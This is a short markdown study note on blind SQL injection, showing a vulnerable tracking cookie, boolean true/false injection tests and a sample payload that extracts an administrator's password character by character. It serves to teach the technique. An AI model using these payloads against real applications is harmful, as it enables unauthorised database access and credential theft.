---
Title: Blind SQLi
tags:
  - SQLi
---
Blind SQL is not necessarily being "blind", but rather looking at other intricacies the application returns whenever you inject a query. 

For example, we have this vulnerable cookie.
```
Cookie: TrackingId=abcdefghijklmnopqrstuvwxyz
```
> [!The query that the TrackingId uses ]
> ```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklmnopqrstuvwxyz'

A successful query will return "Welcome!", and an unsuccessful one will return nothing. We can exploit this functionality by injecting arbitrary sql queries, and constantly checking if the query returns "Welcome!" or not.

> [!Example]
> ```sql
> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklmnopqrstuvwxyz' ' AND '1'='1
> -- above returns true
> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklmnopqrstuvwxyz' ' AND '1'='2
> -- above returns false

> [!Sample payload]
> ```sql
> -- SUBSTRING(<string>, )
> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm


